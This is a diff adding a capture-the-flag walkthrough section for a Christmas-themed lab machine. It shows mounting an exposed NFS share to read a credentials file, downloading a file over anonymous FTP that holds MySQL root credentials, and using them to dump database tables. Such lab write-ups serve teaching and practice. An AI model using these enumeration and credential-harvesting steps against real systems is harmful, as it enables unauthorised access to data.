@@ -433,3 +433,40 @@ find out what XXX is GL
 ## Who is on line 52 of the nice list?
 ```cat -n nice_list.txt | grep XX```
 GL
+# Elf Applications 
+```
+McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 
+
+Deploy the machine and starting scanning the IP. The machine may take a few minutes to boot up.
+```
+READ [this](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#)
+## What is the password inside the creds.txt file?
+```console
+kali@kali:~$ mkdir Day10NFS
+kali@kali:~$ sudo mount -t nfs 10.10.86.177:/ Day10NFS/
+kali@kali:~$ cd Day10NFS/opt/files/
+kali@kali:~/Day10NFS/opt/files$ cat creds.txt
+```
+## What is the name of the file running on port 21?
+btw you need to be a root to get the file otherwirse it you will keep geting permission deniend 
+```console
+$ ftp 10.10.86.177 # username anonymous password anonymous
+ftp> ls
+ftp> binary
+ftp> get <thefile>
+ftp> exit
+$ cat <thefile>
+remember to wipe mysql:
+root
+ff912ABD*
+```
+## What is the password after enumerating the database?
+we got mysql cerdential from the last task. find out more about mysql command click [link](https://gist.github.com/hofmannsven/9164408)
+```mysql -h 10.10.86.177 -u root -p``` connect to mysql server. To complete this task use following cmd
+```mysql
+show databases;
+use [database];
+show tables;
+SELECT * FROM [table];
+```
+GL
